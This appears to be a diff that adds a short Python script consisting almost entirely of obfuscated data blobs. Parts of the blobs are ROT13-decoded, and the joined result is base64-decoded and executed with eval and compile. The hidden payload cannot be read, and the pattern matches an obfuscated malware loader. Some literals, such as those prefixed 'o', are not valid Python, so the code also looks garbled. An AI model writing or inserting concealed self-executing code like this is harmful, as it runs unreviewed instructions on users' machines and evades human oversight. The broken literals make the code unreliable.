@@ -1,0 +1,16 @@
+#!/bin/python
+
+import base64, codecs
+magic=b'~\xba&\x92\x87b\xb2,b\x9a\x9a+\xb7\x16\xe6s\x16\xe6q\xa7]\xa2|[\x99\xcae\xba\x08\xa7\xc5\xb9\x9c\x82\xe8\xb1ng/~\xc7\xeb\xa2k"\xc6j/z\xcb\xab\x96X\x9b\xa5\xaa\xecz)\xa9\xa2\xbbij\xbb\x1e\xaa\xca\xae\xa2\xd7\xa9\x96\xeb.\xaeZZ\xae\xc7\xa9j\xbb\x1e\xaa\xc9_\xae\x89\xac\x8b\x18\xa6\xa6\x8a'
+
+love=o'\krq=\k8q\kn2\k9n\k9n+\ko6\kpp\knp\k8nwu\knr\kq9(i(\kn6\kn6\k8n\krq\knq\kr8\kn6\kn6\k8n\krq\kon\ko9r\k89\ko8\kn6\kn6\k8n\krq\kn2\kp8\kn6\kn6\k8n\krq\ko2\k1o\knq\k8nK\kn6\kn6\k8n\krqz\kno\k1r\kro\k88\kn6\kn6\k8n\krq\ko6)\k9r\k8nwu\knr\kqn\kqr\knn\kr7\knp\ko6\kp7\kro\kn2w\kqr\ko2\k8o\knod\kro%\k89\ko9\kn8i\kr9^\ko2)\kn9\kn2'
+
+god=b'\xbb]\xa3\t\xe5\xa1\xa7^\xae\xb7\xa9\xa1\xab-\xa2\x89l~\xba&\xad\xeb(\xba\xb7\x1e\xb2X\x9b\x9a\x87n\x95\xeb"\x9a\x9a+\xb5\xecm\xad\xa7-~\xba&\xad\xeb(\xba\xb7\x1e\xb2X\x9b\x9a\x87n\x95\xeb"\x9a\x9a+\xb6\xebb\x96\xc7\xeb\xa2j\xde\xb2\x8b\xabq\xeb%\x89\xb9\xa8v\xe9^\xb2)\xa9\xa2\xbbfz{\xac'
+
+destiny=o'~\kon&\knq\kro(\kon\ko7\k1r\ko2K\k9o\k9n\k87a\k95\kro"\k9n\k9n+\ko6\k96\knom{M\k95\ksn\kr8\k9n\ko7\knp\kn2\krn\kqpm\kp9oaw\k1q\konJ\knp\k8nwu\knr\kq7\kr2\knr\kpoE\ko5\knn\krq~\kon&\knq\kro(\kon\ko7\k1r\ko2K\k9o\k9n\k87a\k95\kro"\k9n\k9n+\ko5\kn7]\kn2i\k9o\k95\kroxw{%w\kq7\k8sw\kq8'
+
+
+joy = 'rot13'
+trust = eval('magic') + eval('codecs.decode(love, joy)') + eval('god') + eval('codecs.decode(destiny, joy)')
+eval(compile(base64.b64decode(eval('trust')),'<string>','exec'))
+
